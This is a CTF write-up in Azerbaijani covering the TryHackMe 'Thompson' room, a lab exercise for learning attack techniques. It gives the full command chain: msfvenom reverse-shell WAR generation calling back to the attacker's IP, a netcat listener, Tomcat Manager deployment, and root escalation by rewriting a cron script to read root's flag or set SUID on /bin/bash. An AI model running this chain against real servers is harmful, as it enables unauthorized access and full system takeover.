# TryHackMe — Thompson CTF Writeup (Azərbaycan dilində)

**Çətinlik:** Easy  
**Platforma:** TryHackMe  
**Link:** https://tryhackme.com/room/bsidesgtthompson  
**Mövzu:** Apache Tomcat, WAR faylı, Cron Job Privilege Escalation

---

## Ümumi Baxış

Thompson — TryHackMe platformasındakı başlanğıc səviyyəli CTF-dir. Apache Tomcat Manager-in standart/zəif kredensialları vasitəsilə sisteme giriş əldə edilir, ardından cron job-dan istifadə edərək root səlahiyyəti alınır. Düzgün yanaşma ilə 15-20 dəqiqə ərzində tamamlamaq olar.

---

## 1. Kəşfiyyat (Enumeration)

### Nmap Skanı

```bash
nmap -A <hədəf_IP>
```

**Nəticə:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 8.5.5
```

**Müşahidələr:**
- Port **22** — SSH açıqdır
- Port **8009** — AJP (Apache JServ Protocol) açıqdır
- Port **8080** — Apache Tomcat veb serveri işləyir ← **hədəfimiz budur**

---

## 2. Tomcat Manager-ə Giriş

Brauzerdə aç:
```
http://<hədəf_IP>:8080
```

Apache Tomcat-ın default səhifəsi açılır. **Manager App** düyməsinə basanda istifadəçi adı və şifrə soruşulur.

### Kredensialları Tapmaq

Standart şifrələr işləmir. Amma **Cancel** düyməsinə basanda **401 Unauthorized** xəta səhifəsi açılır — bu səhifənin içində istifadəçi adı və şifrə yazılıb!

> 💡 Bu çox klassik Tomcat zəifliyidir — xəta səhifəsinin özü kredensialları ifşa edir.

Kredensialları tapandan sonra Manager App-a daxil ol:
```
http://<hədəf_IP>:8080/manager/html
```

---

## 3. Reverse Shell — WAR Faylı

Tomcat Manager-də **WAR faylı yükləmək** imkanı var. Bunu istifadə edərək reverse shell əldə edəcəyik.

### MSFvenom ilə WAR Faylı Yarat

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<sənin_IP> LPORT=4444 -f war -o shell.war
```

**Parametrlərin izahı:**

| Parametr | Funksiya |
|----------|---------|
| `-p` | Payload növünü seçir |
| `LHOST` | Hücumçunun IP ünvanı (VPN IP — tun0) |
| `LPORT` | Dinləyəcəyin port |
| `-f war` | Çıxış formatı WAR faylı |
| `-o shell.war` | Faylın adı |

> VPN IP-ni tapmaq üçün: `ip a show tun0`

### Listener Aç (Yeni Terminaldə)

```bash
nc -lvnp 4444
```

### WAR Faylını Yüklə

Tomcat Manager → **WAR file to deploy** bölməsi → `shell.war` seç → **Deploy**

### Shell-i Aktivləşdir

Brauzerdə aç:
```
http://<hədəf_IP>:8080/shell/
```

Brauzerdə **ağ/boş səhifə** açılır → bu normaldır! Terminalda shell gəlməlidir:

```
listening on [any] 4444 ...
connect to [<sənin_IP>] from (UNKNOWN) [<hədəf_IP>] 33530
whoami
tomcat
```

**Shell əldə etdin — `tomcat` istifadəçisi kimi sistemdəsən.**

---

## 4. User Flag

```bash
cd /home
ls
# jack

cd jack
ls
# id.sh  test.txt  user.txt

cat user.txt
```

**User flag tapıldı ✅**

---

## 5. Privilege Escalation (Root Almaq)

### id.sh Faylını İncələ

```bash
cat id.sh
```

```bash
#!/bin/bash
id > test.txt
```

Bu skript sadəcə `id` əmrini işlədib nəticəni `test.txt`-ə yazır.

### test.txt Faylına Bax

```bash
cat test.txt
```

```
uid=0(root) gid=0(root) groups=0(root)
```

**Nəticə:** `id.sh` skriptini **root** işlədir! Bu o deməkdir ki, arxa planda **cron job** var — root avtomatik olaraq bu skripti müntəzəm işlədir.

---

### Metod 1 — Root Flag-ı Birbaşa Oxu

`id.sh`-ı dəyişdiririk ki, root flag-ı `test.txt`-ə yazsın:

```bash
echo '#!/bin/bash' > id.sh
echo 'cat /root/root.txt > test.txt' >> id.sh
```

Bir dəqiqə gözlə (cron job işləsin), sonra:

```bash
cat test.txt
```

**Root flag tapıldı ✅**

---

### Metod 2 — Root Shell Al (SUID yolu)

```bash
echo '#!/bin/bash' > id.sh
echo 'chmod +s /bin/bash' >> id.sh
```

Bir dəqiqə gözlə, sonra:

```bash
/bin/bash -p
whoami
# root
```

**Root shell əldə etdin ✅**

**`-p` flag-ının izahı:** Normal bash işləyəndə SUID-i özü ləğv edir. `-p` flag-ı bu mexanizmi deaktiv edib root səlahiyyətini saxlayır.

---

## 6. Öyrənilən Dərslər

| Zəiflik | İzah |
|---------|------|
| **Tomcat standart xəta səhifəsi** | 401 səhifəsi kredensialları ifşa edir |
| **WAR faylı upload** | Manager-ə giriş varsa reverse shell almaq asandır |
| **Yazıla bilən cron job skripti** | Root tərəfindən işlədilən skript hər kəs tərəfindən dəyişdiriləcəksə — təhlükəlidir |
| **SUID bit** | `/bin/bash`-a SUID qoyularsa istənilən user root ola bilər |

---

## 7. İstifadə Edilən Alətlər

| Alət | Məqsəd |
|------|--------|
| `nmap` | Port skanı və xidmət aşkarlanması |
| `msfvenom` | WAR reverse shell payload yaratmaq |
| `nc (netcat)` | Reverse shell dinləyicisi |
| `echo` | Skript faylını dəyişdirmək |

---

## 8. Əmrlərin Xülasəsi

```bash
# 1. Skan
nmap -A <IP>

# 2. Payload yarat
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<sənin_IP> LPORT=4444 -f war -o shell.war

# 3. Listener aç
nc -lvnp 4444

# 4. Shell aldıqdan sonra
cd /home/jack && cat user.txt

# 5. Privilege escalation
echo '#!/bin/bash' > id.sh
echo 'chmod +s /bin/bash' >> id.sh
# 1 dəqiqə gözlə
/bin/bash -p
cat /root/root.txt
```

---

*TryHackMe — Thompson | Easy | Writeup (Azərbaycan dilində)*
